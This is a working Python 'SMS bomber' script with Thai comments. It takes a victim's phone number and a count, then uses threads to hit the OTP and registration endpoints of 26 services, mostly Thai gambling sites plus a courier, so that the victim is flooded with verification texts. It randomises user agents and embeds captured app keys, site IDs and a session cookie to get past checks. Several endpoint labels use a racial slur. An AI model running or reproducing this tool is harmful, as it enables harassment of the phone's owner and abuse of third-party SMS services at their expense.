import phonenumbers
import requests
import random
import time
from fake_useragent import UserAgent
import json
import threading
import queue
from requests.exceptions import JSONDecodeError

ua = UserAgent()

# Lock สำหรับการเขียนไฟล์
file_lock = threading.Lock()
# สถานะการแจ้งเตือน API และ cooldown
api_status = {
    "api1": {"active": True, "cooldown": 0, "notified": False},  # Gogo-Shop
    "api2": {"active": True, "cooldown": 0, "notified": False},  # Kex-Express
    "api3": {"active": True, "cooldown": 0, "notified": False},  # Jaomuehuay
    "api4": {"active": True, "cooldown": 0, "notified": False},  # Jut8
    "api5": {"active": True, "cooldown": 0, "notified": False},  # Cdo888
    "api6": {"active": True, "cooldown": 0, "notified": False},  # Joneslot
    "api7": {"active": True, "cooldown": 0, "notified": False},  # Swin168
    "api8": {"active": True, "cooldown": 0, "notified": False},  # Johnwick168
    "api9": {"active": True, "cooldown": 0, "notified": False},  # Skyslot7
    "api10": {"active": True, "cooldown": 0, "notified": False}, # Mgi88
    "api11": {"active": True, "cooldown": 0, "notified": False}, # DeeCasino
    "api12": {"active": True, "cooldown": 0, "notified": False}, # Mgame666
    "api13": {"active": True, "cooldown": 0, "notified": False}, # Prompkai
    "api14": {"active": True, "cooldown": 0, "notified": False}, # Fun24
    "api15": {"active": True, "cooldown": 0, "notified": False}, # Wm78bet
    "api16": {"active": True, "cooldown": 0, "notified": False}, # Happy168
    "api17": {"active": True, "cooldown": 0, "notified": False}, # Pgheng
    "api18": {"active": True, "cooldown": 0, "notified": False}, # Aplusfun
    "api19": {"active": True, "cooldown": 0, "notified": False}, # Cueu77778887
    "api20": {"active": True, "cooldown": 0, "notified": False}, # Oneforbet
    "api21": {"active": True, "cooldown": 0, "notified": False}, # Joker123ths
    "api22": {"active": True, "cooldown": 0, "notified": False},  # Jklmn23456
    "api23": {"active": True, "cooldown": 0, "notified": False},
    "api24": {"active": True, "cooldown": 0, "notified": False},
    "api25": {"active": True, "cooldown": 0, "notified": False},
    "api26": {"active": True, "cooldown": 0, "notified": False},
}
api_lock = threading.Lock()

# ฟังก์ชันส่ง OTP สำหรับแต่ละ API (เหมือนเดิมจากโค้ดต้นฉบับ)
def api1(phone):
    """Gogo-Shop"""
    url = "https://gogo-shop.com/app/index/send_sms"
    headers = {"Host": "gogo-shop.com", "User-Agent": ua.random, "Accept": "*/*", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://gogo-shop.com", "Referer": "https://gogo-shop.com/app/index/register?username=39014291"}
    data = f"type=1&telephone={phone}&select=66"
    try:
        response = requests.post(url, headers=headers, data=data, timeout=15)
        if response.status_code == 200 and '"code":1' in response.text:
            return response, "N/A"
        return response, None
    except Exception:
        return None, None

def api2(phone):
    """Kex-Express"""
    url = f"https://io.th.kex-express.com/firstmile-api/v3/keweb/otp/request/{phone}"
    headers = {"Host": "io.th.kex-express.com", "User-Agent": ua.random, "Accept": "application/json, text/plain, */*", "Appid": "Website_Api", "Appkey": "fcdf0569-c2a1-4dee-bd22-9d5361c047f2", "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://th.kex-express.com", "Referer": "https://th.kex-express.com/"}
    try:
        response = requests.post(url, headers=headers, timeout=15)
        if response.status_code == 200 and '"code":200' in response.text:
            return response, json.loads(response.text).get("result", {}).get("reference", "N/A")
        return response, None
    except Exception:
        return None, None

def api3(phone):
    """Jaomuehuay"""
    url = "https://jaomuehuay.io/api/auth/send-otp"
    headers = {"Host": "jaomuehuay.io", "User-Agent": ua.random, "Accept": "application/json", "Content-Type": "application/json", "Origin": "https://jaomuehuay.io", "Referer": "https://jaomuehuay.io/register/jaomuehuay"}
    payload = {"phone_number": phone, "affiliateCode": "jaomuehuay", "type": 1}
    try:
        response = requests.post(url, headers=headers, json=payload, timeout=15)
        if response.status_code == 200 and '"Success":true' in response.text:
            return response, "N/A"
        return response, None
    except Exception:
        return None, None

def api4(phone):
    """Jut8"""
    url = "https://www.jut8.com/api/user/request-register-tac"
    headers = {"Host": "www.jut8.com", "User-Agent": ua.random, "Accept": "application/json", "Content-Type": "application/json", "Origin": "https://www.jut8.com", "Referer": "https://www.jut8.com/th-th?signup=1"}
    payload = {"uname": "", "sendType": "mobile", "country_code": "66", "currency": "THB", "mobileno": phone, "language": "th", "langCountry": "th-th"}
    try:
        response = requests.post(url, headers=headers, json=payload, timeout=15)
        if response.status_code == 200 and '"status":true' in response.text:
            return response, "N/A"
        return response, None
    except Exception:
        return None, None

def api5(phone):
    """Cdo888"""
    url = "https://m.cdo888.bet/ajax/submitOTP"
    headers = {"Host": "m.cdo888.bet", "User-Agent": ua.random, "Accept": "*/*", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://m.cdo888.bet", "Referer": "https://m.cdo888.bet/user/register"}
    data = f"send_otp={phone}"
    try:
        response = requests.post(url, headers=headers, data=data, timeout=15)
        if response.status_code == 200 and '"status":"success"' in response.text:
            return response, "N/A"
        return response, None
    except Exception:
        return None, None

def api6(phone):
    """Joneslot"""
    url = "https://www.joneslot.me/pussy888/otp.php?m=request"
    headers = {"Host": "www.joneslot.me", "User-Agent": ua.random, "Accept": "application/json, text/javascript, */*; q=0.01", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://www.joneslot.me", "Referer": "https://www.joneslot.me/pussy888/register"}
    data = f"phone={phone}"
    try:
        response = requests.post(url, headers=headers, data=data, timeout=15)
        if response.status_code == 200 and '"status":"success"' in response.text:
            return response, "N/A"
        return response, None
    except Exception:
        return None, None

def api7(phone):
    """Swin168"""
    url = "https://play.swin168.me/api/register/sms"
    headers = {"Host": "play.swin168.me", "User-Agent": ua.random, "Accept": "application/json, text/javascript, */*; q=0.01", "Content-Type": "application/json", "Origin": "https://play.swin168.me", "Referer": "https://play.swin168.me/register/"}
    payload = {"phone": phone, "agent_id": 1, "country_code": "TH"}
    try:
        response = requests.post(url, headers=headers, json=payload, timeout=15)
        if response.status_code == 200:
            return response, "N/A"
        return response, None
    except Exception:
        return None, None

def api8(phone):
    """Johnwick168"""
    url = "https://www.johnwick168.me/signup.php"
    headers = {"Host": "www.johnwick168.me", "User-Agent": ua.random, "Accept": "*/*", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://www.johnwick168.me", "Referer": "https://www.johnwick168.me/signup.php"}
    data = f"act=step-1&tel={phone}"
    try:
        response = requests.post(url, headers=headers, data=data, timeout=15)
        if response.status_code == 200:
            return response, "N/A"
        return response, None
    except Exception:
        return None, None

def api9(phone):
    """Skyslot7"""
    url = "https://skyslot7.me/member/otp.php?m=request"
    headers = {"Host": "skyslot7.me", "User-Agent": ua.random, "Accept": "application/json, text/javascript, */*; q=0.01", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://skyslot7.me", "Referer": "https://skyslot7.me/member/register"}
    data = f"phone={phone}"
    try:
        response = requests.post(url, headers=headers, data=data, timeout=15)
        if response.status_code == 200 and '"status":"success"' in response.text:
            return response, "N/A"
        return response, None
    except Exception:
        return None, None

def api10(phone):
    """Mgi88"""
    url = "https://mgi88.me/api/otp"
    headers = {"Host": "mgi88.me", "User-Agent": ua.random, "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "https://mgi88.me", "Referer": "https://mgi88.me/"}
    payload = {"telefon_number": phone, "registrera_typ": ""}
    try:
        response = requests.post(url, headers=headers, json=payload, timeout=15)
        if response.status_code == 200 and '"code":200' in response.text:
            return response, "N/A"
        return response, None
    except Exception:
        return None, None

def api11(phone):
    """DeeCasino"""
    url = "https://play.dee.casino/api/register/sms"
    headers = {"Host": "play.dee.casino", "User-Agent": ua.random, "Accept": "application/json, text/javascript, */*; q=0.01", "Content-Type": "application/json", "Origin": "https://play.dee.casino", "Referer": "https://play.dee.casino/register"}
    payload = {"phone": phone, "agent_id": 1, "country_code": "TH"}
    try:
        response = requests.post(url, headers=headers, json=payload, timeout=15)
        if response.status_code == 200:
            return response, "N/A"
        return response, None
    except Exception:
        return None, None

def api12(phone):
    """Mgame666"""
    url = "https://gw.mgame666.com/AuthAPI/SendSms"
    headers = {"Host": "gw.mgame666.com", "User-Agent": ua.random, "Accept": "*/*", "Content-Type": "application/json", "Origin": "https://okmega.pgm77.com", "Referer": "https://okmega.pgm77.com/"}
    payload = {"Phone": phone}
    try:
        response = requests.post(url, headers=headers, json=payload, timeout=15)
        if response.status_code == 200:
            return response, "N/A"
        return response, None
    except Exception:
        return None, None

def api13(phone):
    """Prompkai"""
    url = "https://api.prompkai.com/auth/preRegister"
    headers = {"Host": "api.prompkai.com", "User-Agent": ua.random, "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "https://www.prompkai.com", "Referer": "https://www.prompkai.com/"}
    payload = {"username": phone}
    try:
        response = requests.post(url, headers=headers, json=payload, timeout=15)
        if response.status_code == 200 and '"error":false' in response.text:
            return response, "N/A"
        return response, None
    except Exception:
        return None, None

def api14(phone):
    """Fun24"""
    url = "https://www.fun24.bet/_ajax_/v3/register/request-otp"
    headers = {"Host": "www.fun24.bet", "User-Agent": ua.random, "Accept": "*/*", "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://www.fun24.bet", "Referer": "https://www.fun24.bet/สล็อตfun24-เว็บสล็อตที่แตกบ่อยแตกหนัก-แตกง่าย"}
    data = f"phoneNumber={phone}"
    try:
        response = requests.post(url, headers=headers, data=data, timeout=15)
        if response.status_code == 200:
            return response, "N/A"
        return response, None
    except Exception:
        return None, None

def api15(phone):
    """Wm78bet"""
    url = "https://wm78bet.bet/_ajax_/v3/register/request-otp"
    headers = {"Host": "wm78bet.bet", "User-Agent": ua.random, "Accept": "*/*", "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://wm78bet.bet", "Referer": "https://wm78bet.bet/เว็บเกมส์สล็อต"}
    data = f"phoneNumber={phone}"
    try:
        response = requests.post(url, headers=headers, data=data, timeout=15)
        if response.status_code == 200:
            return response, "N/A"
        return response, None
    except Exception:
        return None, None

def api16(phone):
    """Happy168"""
    url = "https://m.happy168.xyz/api/otp"
    headers = {"Host": "m.happy168.xyz", "User-Agent": ua.random, "Accept": "application/json", "Content-Type": "application/json", "Origin": "https://m.happy168.xyz", "Referer": "https://m.happy168.xyz/?hid=V0H3O1B4TH"}
    payload = {"phone_number": phone, "register_type": ""}
    try:
        response = requests.post(url, headers=headers, json=payload, timeout=15)
        if response.status_code == 200 and '"code":200' in response.text:
            return response, "N/A"
        return response, None
    except Exception:
        return None, None

def api17(phone):
    """Pgheng"""
    url = "https://pgheng.amaheng.com/api/otp?lang=th"
    headers = {"Host": "pgheng.amaheng.com", "User-Agent": ua.random, "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "https://pgheng.amaheng.com", "Referer": "https://pgheng.amaheng.com/register?hid=T0F1K1A5RC"}
    payload = {"phone_number": phone, "register_type": "", "type_otp": "register"}
    try:
        response = requests.post(url, headers=headers, json=payload, timeout=15)
        if response.status_code == 200 and '"code":200' in response.text:
            return response, "N/A"
        return response, None
    except Exception:
        return None, None

def api18(phone):
    """Aplusfun"""
    url = "https://www.aplusfun.bet/_ajax_/v3/register/request-otp"
    headers = {"Host": "www.aplusfun.bet", "User-Agent": ua.random, "Accept": "*/*", "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://www.aplusfun.bet", "Referer": "https://www.aplusfun.bet/spinix-สล็อตออนไลน์เดิมพันสุดมันส์ไม่มีเบื่อ"}
    data = f"phoneNumber={phone}"
    try:
        response = requests.post(url, headers=headers, data=data, timeout=15)
        if response.status_code == 200:
            return response, "N/A"
        return response, None
    except Exception:
        return None, None

def api19(phone):
    """Cueu77778887"""
    url = "https://api-players.cueu77778887.com/register-otp"
    headers = {"Host": "api-players.cueu77778887.com", "User-Agent": ua.random, "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "https://lcbet44.electrikora.com", "Referer": "https://lcbet44.electrikora.com/", "X-Exp-Signature": "62b3e4c0138d8500127860d5", "Authorization": "Bearer null"}
    payload = {"brands_id": "62b3e4c0138d8500127860d5", "tel": phone, "token": "", "captcha_id": "", "lot_number": "", "pass_token": "", "gen_time": "", "captcha_output": ""}
    try:
        response = requests.post(url, headers=headers, json=payload, timeout=15)
        if response.status_code in (200, 201) and '"message":"ดำเนินการสำเร็จ"' in response.text:
            return response, "N/A"
        return response, None
    except Exception:
        return None, None

def api20(phone):
    """Oneforbet"""
    url = "https://api.oneforbet.com/auth/player/phone-check"
    headers = {"Host": "api.oneforbet.com", "User-Agent": ua.random, "Accept": "*/*", "Content-Type": "application/json; charset=UTF-8", "Origin": "https://ohana888.net", "Referer": "https://ohana888.net/", "X-Site-Id": "26336fef-e961-449c-926d-93db6afef9c4", "X-Agency-Id": "df87f52d-4221-49b6-b6cb-827f92244b72"}
    payload = {"phone_number": phone}
    try:
        response = requests.post(url, headers=headers, json=payload, timeout=15)
        if response.status_code == 200 and '"status":"success"' in response.text:
            return response, json.loads(response.text).get("data", {}).get("otp_token", "N/A")
        return response, None
    except Exception:
        return None, None

def api21(phone):
    """Joker123ths"""
    url = "https://m.joker123ths.shop/api/otp"
    headers = {"Host": "m.joker123ths.shop", "User-Agent": ua.random, "Accept": "application/json", "Content-Type": "application/json", "Origin": "https://m.joker123ths.shop", "Referer": "https://m.joker123ths.shop/?hid=E0G3S1A4YH"}
    payload = {"phone_number": phone, "register_type": ""}
    try:
        response = requests.post(url, headers=headers, json=payload, timeout=15)
        if response.status_code == 200 and '"code":200' in response.text:
            return response, "N/A"
        return response, None
    except Exception:
        return None, None

def api22(phone):
    """Jklmn23456"""
    url = "https://jklmn23456.com/api/v1/user/phone/verify"
    headers = {"Host": "jklmn23456.com", "User-Agent": ua.random, "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "https://pigspin.org", "Referer": "https://pigspin.org/", "ip_address": "182.232.78.75"}
    payload = {"phone_number": phone}
    try:
        response = requests.post(url, headers=headers, json=payload, timeout=15)
        if response.status_code == 200 and '"status":"SUCCESS"' in response.text:
            return response, json.loads(response.text).get("data", {}).get("otp_ref_code", "N/A")
        return response, None
    except Exception:
        return None, None

def api23(phone):
    """i828th OTP Request (request-register-tac)"""
    url = "https://www.i828th.com/api/user/request-register-tac"
    headers = {
        "Host": "www.i828th.com",
        "Connection": "keep-alive",
        "domain": "www.i828th.com",
        "sec-ch-ua-platform": "\"Android\"",
        "lang": "th-th",
        "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Google Chrome\";v=\"138\"",
        "page": "/th-th",
        "sec-ch-ua-mobile": "?1",
        "device": "mobile",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36",
        "accept": "application/json",
        "content-type": "application/json",
        "Origin": "https://www.i828th.com",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://www.i828th.com/th-th?signup=1",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "en-US,en;q=0.9,th-TH;q=0.8,th;q=0.7",
        "Cookie": "prevUrl=https%3A%2F%2Fwww.google.com%2F; ipcountry=TH; _mswin1=fb.1.1753074582459.1245208001; _ga=GA1.1.1963769741.1753074583; click_register_id=reg_btn_5; _tt_enable_cookie=1; _ttp=01K0NP6MMZPFRBM90VZAGE1SE4_.tt.1; _fbp=fb.1.1753074587997.903534775756650704; ttcsid=1753074586284::68daan4eR5wOfWd3OwzM.1.1753074609015; _ga_D8D0PG3DKW=GS2.1.s1753074582$o1$g1$t1753074610$j32$l0$h0; _ga_FXX5V7CMNB=GS2.1.s1753074585$o1$g1$t1753074610$j35$l0$h0; _ga_F7Y9G4D3H6=GS2.1.s1753074584$o1$g1$t1753074610$j34$l0$h0; _ga_53G0PFB7XN=GS2.1.s1753074585$o1$g1$t1753074610$j35$l0$h0; _ga_CXCTN5Q7RG=GS2.1.s1753074585$o1$g1$t1753074610$j35$l0$h0; _ga_1XWRNNZDSV=GS2.1.s1753074586$o1$g1$t1753074610$j36$l0$h0; _ga_8362M6G9PE=GS2.1.s1753074585$o1$g1$t1753074610$j35$l0$h0; _ga_GV9HTY17RV=GS2.1.s1753074586$o1$g1$t1753074611$j35$l0$h0; ttcsid_D17O61BC77UBBP7SA1C0=1753074586281::jfEU0xsdCXsJs8B2_wiM.1.1753074613266"
    }

    # ตัดรหัสประเทศออกถ้ามี
    if phone.startswith("+66"):
        phone = phone[3:]
    elif phone.startswith("66"):
        phone = phone[2:]

    data = {
        "uname": f"66{phone}",
        "sendType": "mobile",
        "country_code": "66",
        "currency": "THB",
        "mobileno": phone,
        "language": "th",
        "langCountry": "th-th"
    }

    try:
        response = requests.post(url, headers=headers, json=data, timeout=15)
        if response.status_code == 200 and '"code":1' in response.text:
            return response, "N/A"
        return response, None
    except Exception:
        return None, None

def api24(phone):
    import requests
    if phone.startswith("+66"): phone = phone[3:]
    elif phone.startswith("66"): phone = phone[2:]
    url = "https://www.thai191.com/api/user/request-register-tac"
    headers = {
        "user-agent": "Mozilla/5.0",
        "content-type": "application/json"
    }
    data = {
        "sendType": "mobile",
        "currency": "THB",
        "country_code": "66",
        "mobileno": phone,
        "language": "th",
        "langCountry": "th-th"
    }
    try:
        r = requests.post(url, headers=headers, json=data, timeout=15)
        return r, "N/A" if r.status_code == 200 and '"code":1' in r.text else None
    except: return None, None

def api25(phone):
    import requests
    if phone.startswith("+66"): phone = phone[3:]
    elif phone.startswith("66"): phone = phone[2:]
    url = "https://pgs42s.online/api/otp?lang=th"
    headers = {
        "user-agent": "Mozilla/5.0",
        "content-type": "application/json"
    }
    data = {
        "phone_number": phone,
        "register_type": "",
        "type_otp": "register"
    }
    try:
        r = requests.post(url, headers=headers, json=data, timeout=15)
        return r, "N/A" if r.status_code == 200 and '"success"' in r.text else None
    except: return None, None

def api26(phone):
    import requests
    if phone.startswith("+66"): phone = phone[3:]
    elif phone.startswith("66"): phone = phone[2:]
    url = "https://pgsoft.pgslotin.app/api/otp"
    headers = {
        "user-agent": "Mozilla/5.0",
        "content-type": "application/json",
        "origin": "https://pgsoft.pgslotin.app",
        "referer": "https://pgsoft.pgslotin.app/"
    }
    data = {
        "phone_number": phone,
        "register_type": ""
    }
    try:
        r = requests.post(url, headers=headers, json=data, timeout=15)
        return r, "N/A" if r.status_code == 200 and '"success"' in r.text else None
    except: return None, None

def clean_phone_number(phone):
    """ทำความสะอาดและตรวจสอบเบอร์โทรศัพท์"""
    phone = phone.strip()
    if phone.startswith("+66"):
        phone = "0" + phone[3:]
    phone = "".join(filter(str.isdigit, phone))
    return phone

def process_phone_with_api(phone, api_name, success_count):
    retry_delay = 5000  # 5000 วินาที
    current_time = time.time()

    # อัพเดทสถานะ API
    with api_lock:
        if not api_status[api_name]["active"] and current_time >= api_status[api_name]["cooldown"]:
            api_status[api_name]["active"] = True
            api_status[api_name]["notified"] = False

    # ถ้า API ไม่ active ให้ข้าม
    with api_lock:
        if not api_status[api_name]["active"]:
            return False, success_count

    # เลือก API ตามชื่อ
    api_map = {
        "api1": (api1, "Gogo-Shop"),
        "api2": (api2, "Kex-Express"),
        "api3": (api3, "Jaomuehuay"),
        "api4": (api4, "Jut8"),
        "api5": (api5, "Cdo888"),
        "api6": (api6, "Joneslot"),
        "api7": (api7, "Swin168"),
        "api8": (api8, "Johnwick168"),
        "api9": (api9, "Skyslot7"),
        "api10": (api10, "Mgi88"),
        "api11": (api11, "DeeCasino"),
        "api12": (api12, "Mgame666"),
        "api13": (api13, "Prompkai"),
        "api14": (api14, "Fun24"),
        "api15": (api15, "Wm78bet"),
        "api16": (api16, "Happy168"),
        "api17": (api17, "Pgheng"),
        "api18": (api18, "Aplusfun"),
        "api19": (api19, "Cueu77778887"),
        "api20": (api20, "Oneforbet"),
        "api21": (api21, "Joker123ths"),
        "api22": (api22, "nigga1"),
        "api23": (api23, "nigga2"),
        "api24": (api24, "nigga3"),
        "api25": (api25, "nigga4"),
        "api26": (api25, "nigga5"),
    }  
    
    api_func, api_label = api_map[api_name]
    start_time = time.time()
    response, ref = api_func(phone)
    end_time = time.time()
    response_time = end_time - start_time

    success_condition = response and response.status_code in (200, 201)
    if success_condition:
        print(f"ส่ง SMS ครั้งที่ {success_count[0] + 1} | เบอร์ {phone} | Response Time: {response_time:.2f} วินาที | Ref: {ref} สำเร็จ")
        success_count[0] += 1
        return True, success_count
    else:
        with api_lock:
            if not api_status[api_name]["notified"]:
                api_status[api_name]["notified"] = True
            api_status[api_name]["active"] = False
            api_status[api_name]["cooldown"] = current_time + retry_delay
        return False, success_count

def worker(phone, api_name, attempt_number, success_count):
    """ประมวลผลการส่ง SMS ด้วย API ที่ระบุ"""
    phone = phone.strip()
    if not phone:
        return

    try:
        parsed_number = phonenumbers.parse(phone, "TH")
        if not (phonenumbers.is_valid_number(parsed_number) and phonenumbers.number_type(parsed_number) == phonenumbers.PhoneNumberType.MOBILE):
            return
    except phonenumbers.NumberParseException:
        return

    success, success_count = process_phone_with_api(phone, api_name, success_count)

def send_sms_to_number(phone_number, num_attempts):
    """ฟังก์ชันหลักสำหรับรับเบอร์โทรและจำนวนครั้งจากผู้ใช้ และส่ง SMS พร้อมกัน"""
    cleaned_phone = clean_phone_number(phone_number)
    if not cleaned_phone or len(cleaned_phone) != 10:
        print(f"เบอร์ {phone_number}: ไม่ถูกต้อง (ต้องมี 10 หลัก)")
        return

    if not isinstance(num_attempts, int) or num_attempts < 1:
        print("จำนวนครั้งต้องเป็นจำนวนเต็มบวก")
        return

    # รายการ API ทั้งหมด
    api_list = list(api_status.keys())
    num_apis = len(api_list)

    # หา API ที่ใช้งานได้
    active_apis = []
    with api_lock:
        for api in api_status:
            if api_status[api]["active"]:
                active_apis.append(api)

    if not active_apis:
        print(f"ไม่มี API ตัวไหนใช้งานได้ในขณะนี้")
        return

    # จำกัดจำนวน thread ตามจำนวน API ที่ใช้งานได้
    max_threads = min(num_attempts, len(active_apis))
    threads = []
    success_count = [0]  # ใช้ list เพื่อเก็บจำนวนครั้งที่สำเร็จ (mutable)

    # สร้าง thread สำหรับแต่ละการส่ง
    for i in range(num_attempts):
        # เลือก API โดยวนลูปตามจำนวนครั้ง
        api_index = i % len(active_apis)  # วนใช้ API ที่ใช้งานได้
        api_name = active_apis[api_index]
        t = threading.Thread(target=worker, args=(cleaned_phone, api_name, i + 1, success_count))
        threads.append(t)
        t.start()

        # เพิ่มดีเลย์เล็กน้อยเพื่อป้องกันการเรียก API พร้อมกันมากเกินไป
        time.sleep(random.uniform(0.1, 0.5))

    # รอให้ทุก thread เสร็จสิ้น
    for t in threads:
        t.join()

    print(f"ส่ง SMS {num_attempts} ครั้ง เสร็จสิ้น | ส่งสำเร็จ {success_count[0]} ครั้ง")

# ตัวอย่างการใช้งาน
if __name__ == "__main__":
    phone_number = input("กรุณาใส่เบอร์โทรศัพท์: ")
    try:
        num_attempts = int(input("กรุณาใส่จำนวนครั้งที่ต้องการส่ง SMS: "))
        send_sms_to_number(phone_number, num_attempts)
    except ValueError:
        print("กรุณาใส่จำนวนครั้งเป็นตัวเลขจำนวนเต็ม")
